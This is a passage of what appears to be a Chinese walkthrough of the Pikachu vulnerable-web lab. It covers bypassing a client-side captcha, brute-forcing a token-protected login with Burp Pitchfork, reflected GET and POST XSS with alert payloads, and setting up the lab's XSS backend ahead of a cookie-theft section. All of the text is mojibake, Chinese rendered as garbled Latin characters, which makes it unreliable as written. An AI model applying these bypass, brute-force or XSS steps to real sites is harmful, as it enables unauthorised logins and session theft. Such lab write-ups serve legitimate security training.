å¹¶ä¸”é€šè¿‡ä¸Šè¿°æµ‹è¯•ï¼Œæ­¤å¤„çš„éªŒè¯ç æ˜¯ä¸€ç›´ç”Ÿæ•ˆï¼Œé‚£æ¥ä¸‹æ¥å°±åŒç¬¬ä¸€å…³åˆ«æ— äºŒè‡´äº†ï¼Œæˆ‘ä»¬åªè¦ç”¨æœ‰æ•ˆçš„éªŒè¯ç ï¼Œå³å¯è¿›è¡Œçˆ†ç ´ç”¨æˆ·åå’Œå¯†ç ï¼Œè¾¾åˆ°ç™»å½•çš„ç›®çš„ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051615815.png)







## 1.3 éªŒè¯ç ç»•è¿‡(on client)


è¿™ä¸€å…³çš„ç‰¹ç‚¹åœ¨äºï¼šå½“ä½ æ•°è¾“å…¥é”™è¯¯çš„éªŒè¯ç åï¼Œä¼šè¿›è¡Œå¼¹çª—è­¦å‘Šï¼š



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051632103.png)



è€Œè¾“å…¥æ­£ç¡®çš„éªŒè¯ç æˆ–è€…è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œéƒ½æ²¡æœ‰å¼¹çª—

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051620750.png)



è¿™é‡Œè¦æ¶‰åŠä¸€ç§æ–¹æ³•ï¼šç¦ç”¨å¼¹çª—ï¼ˆ<font style="color:rgb(77, 77, 77);">F12ï¼Œé€‰æ‹©ç¦ç”¨JavaScript</font>ï¼‰



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051631713.png)



å‹¾é€‰â€œåœç”¨ JavaScriptâ€

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051616709.png)



å†æ¬¡ç‚¹å‡»ç™»å½•æŒ‰é’®ï¼ˆä¸è¾“å…¥éªŒè¯ç ï¼‰ï¼šå‘ç°ä¸è¿›è¡ŒéªŒè¯ç çš„æ ¡éªŒäº†ã€‚

é‚£ä¹ˆä¹‹åçš„æ“ä½œåŒç¬¬ä¸€å…³ï¼Œè¿›è¡Œçˆ†ç ´è´¦æˆ·å’Œå¯†ç 

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051629420.png)





**å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æ•°æ®åŒ…æ¥çœ‹çœ‹å‘ç”Ÿäº†ä»€ä¹ˆï¼š**



è¾“å…¥é”™è¯¯çš„éªŒè¯ç ï¼Œç‚¹å‡»ç™»å½•ï¼Œå‘ç°å¹¶æ²¡æœ‰è¢« burp è·å–åˆ°æ•°æ®åŒ…ï¼Œ

è¿™è¯´æ˜éªŒè¯ç çš„æ ¡éªŒä¸åœ¨æœåŠ¡ç«¯ï¼Œï¼Œè€Œæ˜¯åœ¨å®¢æˆ·ç«¯é€šè¿‡ JavaScript è¿›è¡Œçš„æ ¡éªŒã€‚

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051628155.png)



å½“åœç”¨ JavaScript åï¼Œæ•°æ®åŒ…æ­£å¸¸å‘é€

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051627819.png)



ä¸éœ€è¦éªŒè¯ç ä¹Ÿèƒ½ç™»å½•ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051634397.png)





## 1.4 tokené˜²çˆ†ç ´?
### â€”â€”â€”â€”è¯´æ˜â€”â€”â€”â€”
### ã€Token æ˜¯ä»€ä¹ˆã€‘
åœ¨ Web å®‰å…¨ / Burp åœºæ™¯é‡Œï¼Œ**Token** ä¸€èˆ¬æŒ‡çš„æ˜¯ï¼š

ğŸ‘‰ **ç”¨äºæ ‡è¯†ç”¨æˆ·èº«ä»½æˆ–è¯·æ±‚åˆæ³•æ€§çš„â€œä¸´æ—¶å‡­è¯å­—ç¬¦ä¸²â€**

---

#### ä¸€ã€Token æ˜¯ä»€ä¹ˆ
**Token = æœåŠ¡å™¨å‘ç»™å®¢æˆ·ç«¯çš„ä¸€ä¸²éšæœºå€¼ï¼Œç”¨æ¥è¯æ˜â€œä½ æ˜¯è° / è¿™æ¬¡è¯·æ±‚æ˜¯å¦å¯ä¿¡â€ã€‚**

---

#### äºŒã€å¸¸è§ Token ç±»å‹ï¼ˆå®æˆ˜æœ€é‡è¦ï¼‰
##### 1ï¸âƒ£ Session Tokenï¼ˆä¼šè¯æ ‡è¯†ï¼‰
+ ç™»å½•æˆåŠŸåç”±æœåŠ¡å™¨ç”Ÿæˆ
+ é€šå¸¸å­˜æ”¾åœ¨ï¼š
    - Cookieï¼ˆå¦‚ `PHPSESSID`ã€`JSESSIONID`ï¼‰
+ ä½œç”¨ï¼š**ç»´æŒç™»å½•çŠ¶æ€**

ğŸ“Œ **è¢«ç›—å = ä¼šè¯åŠ«æŒ**

---

##### 2ï¸âƒ£ CSRF Token
+ é˜²æ­¢è·¨ç«™è¯·æ±‚ä¼ªé€ 
+ ç‰¹ç‚¹ï¼š
    - æ¯æ¬¡è¯·æ±‚æˆ–æ¯ä¸ªé¡µé¢ä¸åŒ
    - éšè¡¨å•ä¸€èµ·æäº¤

ç¤ºä¾‹ï¼š

```plain
csrf_token=9f8a7c3b...
```

ğŸ“Œ **æ²¡æœ‰æˆ–å¯é¢„æµ‹ = CSRF æ¼æ´**

---

##### 3ï¸âƒ£ JWT Tokenï¼ˆJSON Web Tokenï¼‰
+ æ— çŠ¶æ€è®¤è¯å¸¸ç”¨
+ ä¸‰æ®µç»“æ„ï¼š

```plain
header.payload.signature
```

+ å¸¸è§ä½ç½®ï¼š
    - `Authorization: Bearer xxx`
    - Cookie

ğŸ“Œ **å¸¸è§æ¼æ´**ï¼š

+ `alg=none`
+ å¼±å¯†é’¥
+ è¿‡æœŸä¸æ ¡éªŒ

---

##### 4ï¸âƒ£ API Token / Access Token
+ ç”¨äº API èº«ä»½è®¤è¯
+ å¸¸è§äºï¼š
    - ç§»åŠ¨ç«¯
    - å‰åç«¯åˆ†ç¦»
    - å¾®æœåŠ¡

---





### â€”â€”â€”â€”æ­£æ–‡â€”â€”â€”â€”


åŒæ ·çš„ï¼ŒæŠ“åŒ…æŸ¥çœ‹ï¼š

å‘ç°å¤šäº†ä¸€ä¸ª `token=6103369537910d3706665116876` å­—æ®µï¼Œ

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051622773.png)



å¯¹äºè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯¹çˆ†ç ´çš„æ–¹å¼è¿›è¡Œè°ƒæ•´ï¼š

å›é¡¾ä¹‹å‰çš„æ”»å‡»æ¨¡å¼ï¼š

**Pitchforkï¼ˆè‰å‰æ¨¡å¼ï¼‰**

**ç‰¹ç‚¹**ï¼š

+ **å¤šä¸ª Payload é›†åˆ**
+ **ä¸€ä¸€å¯¹åº”ï¼ŒåŒæ—¶æ¨è¿›**

****

<font style="color:rgb(77, 77, 77);">æ”»å‡»ç›®æ ‡è¦é€‰æ‹©passwordï¼Œä»¥åŠtokenï¼Œæ”»å‡»æ–¹å¼é€‰æ‹©Pitchfork</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051617465.png)







<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051627599.png)



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051620710.png)









<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051629362.png)





9612269537b079dd3f261030251



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051617210.png)



æŠ¥é”™è§£å†³ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051625698.png)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051633258.png)





<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051636657.png)



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051617560.png)





# <font style="color:rgb(57, 57, 57);">2ã€XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰</font>
> **<font style="color:rgb(57, 57, 57);">XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰æ¦‚è¿°</font>**
>
> <font style="color:rgb(57, 57, 57);">Cross-Site Scripting ç®€ç§°ä¸ºâ€œCSSâ€ï¼Œä¸ºé¿å…ä¸å‰ç«¯å æˆæ ·å¼è¡¨çš„ç¼©å†™"CSS"å†²çªï¼Œæ•…åˆç§°XSSã€‚ä¸€èˆ¬XSSå¯ä»¥åˆ†ä¸ºå¦‚ä¸‹å‡ ç§å¸¸è§ç±»å‹ï¼š  
</font><font style="color:rgb(57, 57, 57);">1.åå°„æ€§XSS;  
</font><font style="color:rgb(57, 57, 57);">2.å­˜å‚¨å‹XSS;  
</font><font style="color:rgb(57, 57, 57);">3.DOMå‹XSS;  

</font><font style="color:rgb(57, 57, 57);">XSSæ¼æ´ä¸€ç›´è¢«è¯„ä¼°ä¸ºwebæ¼æ´ä¸­å±å®³è¾ƒå¤§çš„æ¼æ´ï¼Œåœ¨OWASP TOP10çš„æ’åä¸­ä¸€ç›´å±äºå‰ä¸‰çš„æ±Ÿæ¹–åœ°ä½ã€‚  
</font><font style="color:rgb(57, 57, 57);">XSSæ˜¯ä¸€ç§å‘ç”Ÿåœ¨å‰ç«¯æµè§ˆå™¨ç«¯çš„æ¼æ´ï¼Œæ‰€ä»¥å…¶å±å®³çš„å¯¹è±¡ä¹Ÿæ˜¯å‰ç«¯ç”¨æˆ·ã€‚  
</font><font style="color:rgb(57, 57, 57);">å½¢æˆXSSæ¼æ´çš„ä¸»è¦åŸå› æ˜¯ç¨‹åºå¯¹è¾“å…¥å’Œè¾“å‡ºæ²¡æœ‰åšåˆé€‚çš„å¤„ç†ï¼Œå¯¼è‡´â€œç²¾å¿ƒæ„é€ â€çš„å­—ç¬¦è¾“å‡ºåœ¨å‰ç«¯æ—¶è¢«æµè§ˆå™¨å½“ä½œæœ‰æ•ˆä»£ç è§£ææ‰§è¡Œä»è€Œäº§ç”Ÿå±å®³ã€‚  
</font><font style="color:rgb(57, 57, 57);">å› æ­¤åœ¨XSSæ¼æ´çš„é˜²èŒƒä¸Šï¼Œä¸€èˆ¬ä¼šé‡‡ç”¨â€œå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤â€å’Œâ€œè¾“å‡ºè¿›è¡Œè½¬ä¹‰â€çš„æ–¹å¼è¿›è¡Œå¤„ç†:  
</font><font style="color:rgb(57, 57, 57);">è¾“å…¥è¿‡æ»¤ï¼šå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸å¯èƒ½å¯¼è‡´XSSæ”»å‡»çš„å­—ç¬¦è¾“å…¥;  
</font><font style="color:rgb(57, 57, 57);">è¾“å‡ºè½¬ä¹‰ï¼šæ ¹æ®è¾“å‡ºç‚¹çš„ä½ç½®å¯¹è¾“å‡ºåˆ°å‰ç«¯çš„å†…å®¹è¿›è¡Œé€‚å½“è½¬ä¹‰;  
</font>
>
> <font style="color:rgb(57, 57, 57);">  
</font><font style="color:rgb(57, 57, 57);">ä½ å¯ä»¥é€šè¿‡â€œCross-Site Scriptingâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚</font>
>

<font style="color:rgb(57, 57, 57);"></font>

## 2.1 åå°„å‹xss(get)
### æ¼æ´åŸç†ï¼ˆè¿™æ˜¯é‡ä¸­ä¹‹é‡ï¼Œå¿…é¡»å®Œå…¨ç†è§£æŒæ¡ï¼‰ï¼š
**ç”¨æˆ·è¾“å…¥çš„æ•°æ®é€šè¿‡ GET å‚æ•°æäº¤ï¼ŒæœåŠ¡å™¨æœªåšå……åˆ†è¿‡æ»¤/è½¬ä¹‰ï¼Œç›´æ¥å›æ˜¾åˆ°é¡µé¢ä¸­ï¼Œå¯¼è‡´æµè§ˆå™¨æŠŠæ¶æ„è„šæœ¬å½“ä½œæ­£å¸¸ä»£ç æ‰§è¡Œã€‚**



å°è¯•è¾“å…¥ `111`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051625394.png)

<font style="color:rgb(57, 57, 57);"></font>

è¾“å…¥ `asd`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051623531.png)



å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬è¾“å…¥çš„å†…å®¹ï¼Œä»–éƒ½ä¼šæ˜¾ç¤ºåœ¨ `who is <>,i don't care!` è¿™å¥è¯çš„ `<>` ä¸­ï¼Œ

å¦‚æœæƒ³è®©ä»–æ‰§è¡Œä»£ç ï¼Œé‚£æˆ‘åº”è¯¥è¾“å…¥ä¸€ä¸²ä»£ç ï¼Œ

å…³é”®æ˜¯åº”è¯¥è¾“å…¥ä»€ä¹ˆè¯­è¨€å‘¢ï¼Ÿ

****

**æµè§ˆå™¨èƒ½æ‰§è¡Œçš„è¯­è¨€ â€”â€” JavaScript**

åŸå› å¾ˆç®€å•ï¼š

é¡µé¢æœ€ç»ˆæ˜¯ **æµè§ˆå™¨è§£æï¼Œ**æµè§ˆå™¨åªä¼šæ‰§è¡Œï¼š

    - **HTML**
    - **JavaScript**

æ‰€ä»¥ **XSS çš„æœ¬è´¨ = æ³¨å…¥ HTML / JavaScript**



æœ€å¸¸ç”¨çš„ payloadï¼š

```plain
<script>alert('1')</script>
```

`<script> ... </script>`

 **HTML æ ‡ç­¾ï¼Œ**ä½œç”¨ï¼š**å‘Šè¯‰æµè§ˆå™¨ï¼šä¸­é—´çš„å†…å®¹æ˜¯ JavaScriptï¼Œè¦æ‰§è¡Œ**

+ `alert()`ï¼šæµè§ˆå™¨å†…ç½®å‡½æ•°ï¼Œ**å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†**
+ `'1'`ï¼šå­—ç¬¦ä¸²å‚æ•°ï¼Œæ˜¾ç¤ºçš„å†…å®¹



å½“æˆ‘ä»¬ç²˜è´´çš„æ—¶å€™å‘ç°ï¼Œå¹¶ä¸èƒ½å®Œå…¨å†™å…¥ï¼Œè¿™æ˜¯å› ä¸ºè¯¥å¤„çš„è¾“å…¥æ¡†å¯¹è¾“å…¥çš„å­—ç¬¦é•¿åº¦è¿›è¡Œäº†é™åˆ¶

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051633733.png)



ç›´æ¥ä¿®æ”¹å‰ç«¯ä»£ç å³å¯ç»•è¿‡ï¼š



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051621803.png)



é€‰ä¸­è¾“å…¥æ¡†ï¼š

æ­¤å¤„çš„å‚æ•° `maxlength` é™åˆ¶äº†è¾“å…¥çš„å­—ç¬¦çš„é•¿åº¦

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051627813.png)



å¯¹å®ƒè¿›è¡Œä¿®æ”¹ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051631898.png)



å®Œæ•´è¾“å…¥ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051635467.png)



39.106.48.91:8765 è¿™ä¸ªå®¹å™¨ç”±äºæ­å»ºåœ¨é˜¿é‡Œäº‘çš„æœåŠ¡å™¨ä¸Šï¼Œæ‰€ä»¥ xss çš„è¯­å¥è¾“ä¸è¿›å»ã€‚ã€‚ã€‚

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051634194.png)





æ­£å¸¸æœ¬åœ°æ­å»ºçš„æ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051619134.png)





## 2.2 åå°„æ€§xss(post)
å¦‚æœä»”ç»†è§‚å¯Ÿï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä¸Šä¸€å…³ä¸­çš„ payload æ˜¯è¾“å…¥åˆ°è¾“å…¥æ¡†ï¼Œç„¶åæ’å…¥åˆ°äº† URL åœ°å€ä¸­æ‰§è¡Œçš„ã€‚è¿™ä¸€ç‚¹å’Œæˆ‘ä»¬è¯´çš„ GET ä¼ å‚æ˜¯ä¸€æ ·çš„ã€‚

è€Œåœ¨è¿™ä¸€å…³ä¸­çš„ POSTï¼ŒæŒ‰ç…§æˆ‘ä»¬çš„ç†è§£ï¼Œä»–åº”è¯¥æ˜¯å°†è¾“å…¥ payload çš„æ–¹å¼æ”¹ä¸ºäº† POSTï¼Œä»è€Œå‘é€æ•°æ®åŒ…æ‰§è¡Œäº† JavaScript ä»£ç ã€‚

å½“ç„¶ï¼ŒXSS å¯ä¸å•å•æ˜¯æ‰§è¡Œäº†å¼¹çª—è¿™ä¹ˆç®€å•ï¼å®ƒè¿˜å¯ä»¥ç”¨æ¥ï¼š

+ Cookie çªƒå–
+ ä¼šè¯åŠ«æŒ
+ é’“é±¼
+ CSRF è”åŠ¨
+ åå°æ¥ç®¡







å›å½’æœ¬é¢˜ï¼š

### æ¼æ´åŸç†ï¼š
**åç«¯å°† POST å‚æ•°æœªç»ä»»ä½• HTML/JS è½¬ä¹‰ç›´æ¥è¾“å‡ºåˆ°é¡µé¢ä¸­ï¼Œå¯¼è‡´æµè§ˆå™¨è§£æå¹¶æ‰§è¡Œäº†æ”»å‡»è€…æ„é€ çš„ JavaScript ä»£ç ã€‚  **

å¿…é¡»å£°æ˜çš„ä¸€ç‚¹æ˜¯ï¼š** æ‰€è°“â€œåå°„å‹ XSSï¼ˆPOSTï¼‰â€ï¼Œå¹¶ä¸æ˜¯æŒ‡å½“å‰é¡µé¢åªèƒ½é€šè¿‡ POST è¯·æ±‚è®¿é—®ï¼Œè€Œæ˜¯æŒ‡ï¼š  
****XSS payload æœ€åˆæ˜¯é€šè¿‡ POST å‚æ•°æäº¤ï¼Œå¹¶åœ¨æœåŠ¡å™¨å“åº”ä¸­è¢«ç›´æ¥åå°„è¾“å‡ºã€‚  **

****

****

****

é¦–å…ˆç™»å½•ï¼ŒæŠ“åŒ…ï¼šadmin/123456  

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051627728.png)



ä»æŠ“åˆ°çš„æ•°æ®åŒ…æ¥åˆ†æï¼š

 ç¬¬ä¸€æ¡æ˜¯ã€ŒPOST ç™»å½•è¯·æ±‚ã€å»ºç«‹ç™»å½•æ€ï¼Œ  æœ¬èº«ä¸äº§ç”Ÿ XSSï¼Œåªæ˜¯**å‰ç½®æ¡ä»¶  **

åªæ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ 

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051631796.png)



 ç¬¬äºŒæ¡æ˜¯ã€Œå¸¦ç€ç™»å½• Cookie çš„é¡µé¢è®¿é—®è¯·æ±‚ã€ï¼Œåå°„å‹ XSSï¼ˆPOSTï¼‰æ­£æ˜¯å‘ç”Ÿåœ¨â€œç™»å½•åé¡µé¢å¯¹ POST æ•°æ®å›æ˜¾â€çš„è¿‡ç¨‹ä¸­ã€‚  ä¹Ÿå°±æ˜¯ä¸Šæ–‡æ‰€è¿°â€œ**XSS å‘ç”Ÿåœ¨â€œæœåŠ¡å™¨å›æ˜¾ç”¨æˆ·è¾“å…¥â€çš„ä½ç½®**â€

ç™»é™†æˆåŠŸåçš„é¡µé¢ï¼Œé‡ç‚¹çœ‹ä»–çš„ Cookieï¼š

```plain
//è¯æ˜ï¼šå½“å‰è®¿é—®è€…æ˜¯â€œå·²ç™»å½•ç”¨æˆ·â€
Cookie: 
ant[uname]=admin;   //å·²ç™»å½•çš„ç”¨æˆ·å
ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815;  //ç™»å½•å‡­è¯
PHPSESSID=v4cp9r4ovlglba0966s4133og1 //ä¼šè¯æ ‡è¯†
```

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051630417.png)



é‚£ä¹ˆä»è¿™ä¿©æ¡è¿”å›çš„æ•°æ®åŒ…èƒ½ç¡®è®¤å‚æ•°æ˜¯é€šè¿‡ POST ä¼ é€’ï¼Œ



å°è¯•è¾“å…¥å†…å®¹ï¼š`111`

å¯ä»¥çœ‹åˆ°å®ƒæ˜¯é€šè¿‡ POST çš„æ–¹å¼ä¼ å›æ¥çš„æ•°æ®ï¼Œå¹¶ä¸”è¾“å…¥ä»€ä¹ˆè¿”å›ä»€ä¹ˆ

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051635253.png)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051629909.png)



é‚£æˆ‘ä»¬å°è¯•å¼¹çª—ï¼š`<script>alert('xss')</script>`

é¡µé¢å¼¹çª—

å¯ä»¥ç¡®è®¤ åå°„å‹ XSS(POST) å­˜åœ¨

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051631861.png)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051619476.png)





æœ¬é¢˜åˆ°æ­¤ä¸ºæ­¢ä¼¼ä¹å·²ç»ç»“æŸäº†ï¼Œä½†æ˜¯æ­£å¦‚ä¸Šæ–‡æ‰€è¯´ï¼Œæˆ‘ä»¬ä¸èƒ½åªåœç•™åœ¨ä¼šå¼¹çª—ï¼Œè¿˜è¦è¿›ä¸€æ­¥çš„åˆ©ç”¨ã€‚

ä¸çŸ¥å¤§å®¶æ˜¯å¦è¿˜è®°å¾—ï¼šç³»ç»Ÿä»‹ç»ä¸­æåˆ°è¿‡** XSS ç®¡ç†åå°**

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051635252.png)

æˆ‘ä»¬æ¥ä¸‹æ¥å°±åˆ©ç”¨** XSS ç®¡ç†åå°**ï¼Œè¿›ä¸€æ­¥åŠ æ·±å¯¹ XSS çš„ç†è§£



### â€”â€”â€”â€”XSS ç®¡ç†åå°çš„é…ç½®â€”â€”â€”â€”
<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051633148.png)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051615325.png)





æ‰¾åˆ°å®‰è£…ç›®å½•çš„ config.inc.php æ–‡ä»¶ï¼š

C:\phpstudy_pro\WWW\pikachu-master\pkxss\inc\config.inc.php

ä¿®æ”¹æ•°æ®åº“é…ç½®ï¼šï¼ˆä¸»è¦ç¡®è®¤ç”¨æˆ·åå’Œå¯†ç æ˜¯å¦ä¸€è‡´ï¼Œå…¶ä»–çš„å‚æ•°è‡ªè¡Œå†³å®šï¼‰

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051625624.png)



è®¿é—®ï¼š[http://pikachu:8088/pkxss/pkxss_install.php](http://pikachu:8088/pkxss/pkxss_install.php)

ç‚¹å‡»â€œå®‰è£…/åˆå§‹åŒ–â€

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051625230.png)

å®‰è£…å®Œæˆå°±å¯ä»¥äº†

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051615225.png)

ç™»å½•åˆ°åå°ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051621180.png)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051631870.png)





##  GET å‹ XSS æ”»å‡»åˆ©ç”¨ï¼ˆCookie çªƒå–ï¼‰  
> åœ¨çœŸå®åœºæ™¯ä¸­ï¼Œæ”»å‡»è€…å¹¶ä¸ä¼šæ»¡è¶³äºç®€å•çš„ `alert()` å¼¹çª—ï¼Œè€Œæ˜¯ä¼šåˆ©ç”¨ XSS æ‰§è¡Œ JavaScript ä»£ç ï¼Œçªƒå–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚ Cookieã€‚
>
